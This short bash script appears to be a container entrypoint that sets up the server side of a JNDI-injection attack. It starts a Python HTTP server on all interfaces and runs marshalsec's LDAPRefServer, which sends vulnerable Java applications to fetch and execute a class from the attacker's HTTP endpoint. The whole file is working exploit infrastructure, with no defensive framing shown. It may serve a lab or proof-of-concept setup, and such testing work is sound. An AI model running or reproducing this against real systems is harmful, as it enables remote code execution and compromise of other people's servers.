#!/bin/bash

echo "Remember to publish container ports for ldap and http"
echo "LDAP: 1389"
echo "HTTP: $HTTP_PORT"
echo

echo -n "Starting HTTP server at `pwd` - "
python3 -m http.server --bind 0.0.0.0 $HTTP_PORT & 
sleep 1
echo

echo "Exposing LDAP server on ldap://$HTTP_HOST:$HOST_LDAP_PORT"
echo "Exposing HTTP endpoint at http://$HTTP_HOST:$HTTP_PORT/#$HTTP_ENDPOINT"
echo
sleep 1

java -cp /app/marshalsec-0.0.3.jar marshalsec.jndi.LDAPRefServer "http://$HTTP_HOST:$HTTP_PORT/#$HTTP_ENDPOINT"
